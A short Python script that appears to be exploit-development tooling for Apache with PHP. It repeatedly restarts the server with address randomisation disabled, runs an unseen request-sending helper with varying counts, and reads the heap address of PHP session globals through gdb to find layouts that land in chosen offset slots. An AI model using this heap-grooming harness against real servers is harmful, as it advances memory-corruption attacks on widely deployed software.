#!/usr/bin/env python3
import subprocess,re,time
def sh(c): return subprocess.run(c,shell=True,capture_output=True,text=True)
def stopstart():
    sh("sudo -n apache2ctl -k stop >/dev/null 2>&1"); time.sleep(0.12)
    sh('sudo -n bash -c "setarch $(uname -m) -R /usr/sbin/apache2ctl -k start" >/dev/null 2>&1'); time.sleep(0.18)
def getid():
    pid=sh('pgrep -f "^/usr/sbin/apache2 -k start" | tail -1').stdout.strip()
    if not pid: return None
    out=sh(f"sudo -n gdb -q -p {pid} -batch -ex 'p/x (unsigned long)ps_globals.id' -ex 'p ps_globals.send_cookie' 2>/dev/null").stdout
    m=re.search(r'\$\d+ = (0x[0-9a-f]+)',out); return int(m.group(1),16) if m else None
for n in range(0,33):
    stopstart()
    sh(f"python3 send_a_s56.py {n} 12 17 >/dev/null 2>&1"); time.sleep(0.08)
    a=getid()
    if a:
        off=a&0xfff
        print(f"N={n} ID=0x{a:x} OFF=0x{off:x} slot={off//0x40} {'<<<' if off in (0xc0,0x2c0,0x4c0,0x6c0,0x8c0,0xac0,0xcc0,0xec0) else ''}",flush=True)
    else:
        print(f"N={n} ID=?",flush=True)
